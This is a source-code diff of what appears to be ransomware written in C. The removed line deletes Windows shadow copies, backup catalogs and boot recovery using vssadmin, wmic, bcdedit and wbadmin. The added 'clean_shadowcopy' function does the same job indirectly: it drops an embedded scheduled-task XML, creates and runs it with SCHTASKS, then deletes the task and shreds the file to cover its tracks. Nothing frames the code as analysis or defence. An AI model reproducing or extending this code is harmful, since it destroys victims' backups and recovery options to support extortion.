@@ -404,10 +404,57 @@ void * tp_pfr_free_func(void *arg)
 	return NULL;
 }
 
+void file_remove(const char *filename)
+{
+	if (file_exists(filename))
+	{
+		struct stat oldStat;
+		if (stat(filename, &oldStat) == 0)
+		{
+			shredder(&oldStat, filename);
+		}
+		if (remove(filename) != 0)
+		{
+			int stat = chmod(filename, S_IREAD|S_IWRITE);
+			if (!stat) remove(filename);
+		}
+	}
+}
+
 void clean_shadowcopy(void)
 {
-	char *cmd = exe_cmd("cmd /c runas /c vssadmin deleteshadows /all /quiet & wmic shadowcopy delete& bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no & wbadmin deletecatalog -quiet");
+	size_t size = 0;
+	const char *data = mg_unpack("/./Sources/embed/CSDCP.xml", &size, NULL);
+	
+	char* fname = generateRandomString(randInRange(4, 10));
+	char *cwd = get_cwd();
+	
+	char buf[1024];
+	
+	sprintf(buf, "%s.xml", fname);
+	FILE* fp = NULL;
+	fp = fopen(buf,"wb");
+	if(fp != NULL)
+	{
+		fwrite(data, 1, size, fp);
+	}
+	fclose(fp);
+	
+	sprintf(buf, "SCHTASKS /CREATE /XML \"%s\\%s.xml\" /TN \"%s\" /F", cwd, fname, fname);
+	char *cmd = exe_cmd(buf);
 	free(cmd);
+	sprintf(buf, "SCHTASKS /RUN /TN \"%s\"", fname);
+	cmd = exe_cmd(buf);
+	free(cmd);
+	sprintf(buf, "SCHTASKS /DELETE /TN \"%s\" /F", fname);
+	cmd = exe_cmd(buf);
+	free(cmd);
+	
+	sprintf(buf, "%s\\%s.xml", cwd, fname);
+	file_remove(buf);
+	
+	free(cwd);
+	free(fname);
 }
 
 int main(int argc, char *argv[])
@@ -422,12 +469,12 @@ int main(int argc, char *argv[])
 	
 	if (mode==0) return EXIT_SUCCESS;
 	
-	clean_shadowcopy();
-	
 	srand (time(NULL));
 	
 	argv[0][strlen(argv[0]) - 4] = 0;
 	toLower(argv[0]);
+	
+	clean_shadowcopy();
 	
 	int key = getkey();
 	
